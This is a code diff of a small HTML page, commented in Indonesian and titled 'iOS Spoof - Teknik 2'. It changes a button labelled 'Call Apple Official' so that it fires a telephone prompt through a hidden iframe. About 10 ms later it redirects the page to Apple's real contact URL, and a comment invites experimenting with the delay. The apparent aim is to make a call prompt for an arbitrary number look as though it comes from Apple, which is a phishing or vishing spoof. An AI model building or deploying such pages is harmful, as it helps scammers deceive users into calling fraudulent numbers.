@@ -2,7 +2,7 @@
 <html>
   <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>iOS Spoof - Teknik 1</title>
+    <title>iOS Spoof - Teknik 2</title>
     <style>
       .btn {
         background: #007aff;
@@ -19,19 +19,24 @@
     </style>
   </head>
   <body>
-    <a href="javascript:void(0)" onclick="runSpoof1()" class="btn"
-      >📞 Contact Apple Support</a
+    <a href="javascript:void(0)" onclick="runSpoof2()" class="btn"
+      >📞 Call Apple Official</a
     >
 
     <script>
-      function runSpoof1() {
-        // Picu prompt telepon
-        window.location.href = "tel:+1234567890";
+      function runSpoof2() {
+        // Buat iframe tersembunyi
+        var iframe = document.createElement("iframe");
+        iframe.style.display = "none";
+        // Picu tel via iframe
+        iframe.src = "tel:+1234567890";
+        document.body.appendChild(iframe);
 
-        // Segera timpa dengan navigasi tab yang sama
+        // Segera navigasikan main window ke URL asli
+        // Cobalah bereksperimen dengan delay 0ms hingga 100ms
         setTimeout(function () {
-          window.open("https://www.apple.com/contact/", "_self");
-        }, 0);
+          window.location.href = "https://www.apple.com/contact/";
+        }, 10);
       }
     </script>
   </body>
